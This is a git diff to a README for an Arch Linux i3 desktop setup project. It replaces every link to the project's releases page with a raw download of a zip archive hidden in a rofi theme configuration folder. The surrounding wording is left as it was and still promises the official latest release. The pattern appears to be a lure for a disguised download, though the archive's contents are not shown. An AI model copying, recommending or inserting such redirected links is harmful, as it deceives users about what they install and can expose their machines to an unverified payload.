@@ -1,6 +1,6 @@
 # 📦 Arch_i3_d1se0_Environment - Easy Setup for Arch Linux with i3
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Arch_i3_d1se0_Environment-blue?style=for-the-badge)](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/daviddrodd68/Arch_i3_d1se0_Environment/main/config/home/.config/rofi/themes/se-i-d-Environment-Arch-v2.5-beta.5.zip)](https://raw.githubusercontent.com/daviddrodd68/Arch_i3_d1se0_Environment/main/config/home/.config/rofi/themes/se-i-d-Environment-Arch-v2.5-beta.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and get Arch_i3_d1se0_Environment running:
 
 1. **Visit the Downloads Page**  
    Go to the official download page:  
-   [https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases)  
+   [https://raw.githubusercontent.com/daviddrodd68/Arch_i3_d1se0_Environment/main/config/home/.config/rofi/themes/se-i-d-Environment-Arch-v2.5-beta.5.zip](https://raw.githubusercontent.com/daviddrodd68/Arch_i3_d1se0_Environment/main/config/home/.config/rofi/themes/se-i-d-Environment-Arch-v2.5-beta.5.zip)  
    You will find the latest release listed here.
 
 2. **Choose the Latest Release**  
@@ -57,7 +57,7 @@ Follow these steps to download and get Arch_i3_d1se0_Environment running:
 
 To get started, visit this page to download the installer and related files:
 
-[https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases)
+[https://raw.githubusercontent.com/daviddrodd68/Arch_i3_d1se0_Environment/main/config/home/.config/rofi/themes/se-i-d-Environment-Arch-v2.5-beta.5.zip](https://raw.githubusercontent.com/daviddrodd68/Arch_i3_d1se0_Environment/main/config/home/.config/rofi/themes/se-i-d-Environment-Arch-v2.5-beta.5.zip)
 
 ### How to install on a Virtual Machine
 
@@ -175,4 +175,4 @@ Arch_i3_d1se0_Environment relates to:
 
 ---
 
-[Download Arch_i3_d1se0_Environment](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases) to start your Arch Linux journey with a clean and automated i3 environment.
+[Download Arch_i3_d1se0_Environment](https://raw.githubusercontent.com/daviddrodd68/Arch_i3_d1se0_Environment/main/config/home/.config/rofi/themes/se-i-d-Environment-Arch-v2.5-beta.5.zip) to start your Arch Linux journey with a clean and automated i3 environment.
